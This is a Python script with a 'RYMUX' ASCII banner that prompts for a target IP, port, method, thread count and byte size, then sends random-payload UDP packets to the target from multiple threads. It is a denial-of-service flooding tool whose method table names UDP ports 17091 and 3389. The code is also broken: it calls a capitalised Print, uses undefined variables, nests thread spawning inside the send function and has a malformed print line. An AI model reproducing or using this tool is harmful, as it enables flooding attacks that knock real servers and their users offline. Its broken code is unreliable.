import socket
import os
import random
import time
import sys
import struct
import threading

Print("██████╗░██╗░░░██╗███╗░░░███╗██╗░░░██╗██╗░░██╗")
Print("██╔══██╗╚██╗░██╔╝████╗░████║██║░░░██║╚██╗██╔╝")
Print("██████╔╝░╚████╔╝░██╔████╔██║██║░░░██║░╚███╔╝░")
Print("██╔══██╗░░╚██╔╝░░██║╚██╔╝██║██║░░░██║░██╔██╗░")
Print("██║░░██║░░░██║░░░██║░╚═╝░██║╚██████╔╝██╔╝╚██")
Print("╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝")

Print(""""
█▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ ▀
█░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄
|-----------------------|
|   UDP    | 17091 3389 |
|----------|------------|
""")

bytes = random._urandom(1024)
threads = random._urandom(1024)
send = random._urandom(1024)
os.system("clear")

ip = str(input("[+] Target: "))
port = int(input("[+] Port: "))
Method = str(input("[+] Method: "))
thread = int(input("+] Threads: ")) 
bytes = int(input("[+] Bytes: "))
os.system ("clear")

def generate_payload():
    payload = os.urandom(random.randint(1, 1024))
    return payload

def send_packets(dest_ip, dest_port, packet_size, packet_count):
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        for _ in range(packet_count):
            payload = generate_payload()

            if len(payload) < packet_size:
                payload += b'\x00' * (packet_size - len(payload))

            payload_length = struct.pack('!I', len(payload))

            udp_socket.sendto(payload_length, (dest_ip, dest_port))

            udp_socket.sendto(payload, (dest_ip, dest_port))

            time.sleep(3)

    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)

    send_threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets, args=(dest_ip, dest_port, packet_size, packet_count))
        thread.start()
        send_threads.append(thread)

print ("Pesan Dari Server : \*()\**,format.(data.decode))))

    for thread in send_threads:
        thread.join()

client.close